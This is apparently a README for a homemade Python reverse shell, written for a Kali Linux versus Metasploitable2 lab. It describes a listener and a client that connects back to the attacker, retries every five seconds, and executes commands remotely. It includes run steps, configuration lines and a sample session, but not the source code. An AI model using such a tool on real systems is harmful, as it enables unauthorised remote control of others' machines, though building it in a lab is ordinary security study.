# Reverse Shell Tool

## Overview

This is a reverse shell implementation that allows an attacker to establish a remote command execution session with a target machine. The setup consists of two components: a listener (server.py) running on the attacker's machine (Kali Linux) and a client (revshell.py) running on the target machine (Metasploitable2). The client connects back to the attacker's machine, establishing a reverse connection that bypasses firewalls and NAT configurations.

## Prerequisites

### Required Packages

No additional packages are required beyond Python's standard library. The implementation uses built-in modules:
- `socket` for network communication
- `json` for data serialization
- `subprocess` for command execution
- `os` for file system operations

## Usage

### Scenario Setup

**Attacker Machine (Kali Linux)**: Runs `server.py` as a listener
**Target Machine (Metasploitable2)**: Runs `revshell.py` as a client that connects back

### Step 1: Start the Listener (Attacker - Kali Linux)

```bash
python3 server.py
```

This will:
1. Start listening on IP `192.168.64.2` port `4444`
2. Display "Listening..." message
3. Wait for incoming connections from the target machine

### Step 2: Execute the Client (Target - Metasploitable2)

```bash
python3 revshell.py
```

This will:
1. Attempt to connect to the attacker's machine at `192.168.64.2:4444`
2. If connection fails, retry every 5 seconds
3. Once connected, wait for commands from the attacker

### Step 3: Command Execution

Once the connection is established:
1. The attacker can type commands at the prompt: `192.168.64.2: `
2. Commands are sent to the target machine
3. The target executes the commands and returns the output
4. Results are displayed on the attacker's terminal

### Example Session

**Attacker Terminal (Kali Linux):**
```
Listening...
Connection from ('192.168.64.3', 54321) established.
Please type your command
192.168.64.2: whoami
www-data
192.168.64.2: pwd
/var/www
192.168.64.2: ls -la
total 8
drwxr-xr-x 2 www-data www-data 4096 Jan 15 10:30 .
drwxr-xr-x 3 root     root     4096 Jan 15 10:30 ..
-rw-r--r-- 1 www-data www-data   20 Jan 15 10:30 index.html
192.168.64.2: exit
```

**Target Terminal (Metasploitable2):**
```
Received: whoami
Result: www-data
Received: pwd
Result: /var/www
Received: ls -la
Result: total 8
drwxr-xr-x 2 www-data www-data 4096 Jan 15 10:30 .
drwxr-xr-x 3 root     root     4096 Jan 15 10:30 ..
-rw-r--r-- 1 www-data www-data   20 Jan 15 10:30 index.html
```

### Configuration

**Important**: Update the IP addresses in both files to match your network configuration:

- In `server.py` line 5: Change `server_ip = '192.168.64.2'` to your Kali Linux IP
- In `revshell.py` line 46: Change `'192.168.64.2'` to your Kali Linux IP

### Features

- **Automatic Reconnection**: Client automatically retries connection if it fails
- **Directory Navigation**: Supports `cd` command for changing directories
- **Real-time Command Execution**: Commands are executed immediately upon receipt
- **JSON Communication**: Uses JSON for reliable data transmission
- **Graceful Exit**: Type `exit` to terminate the session

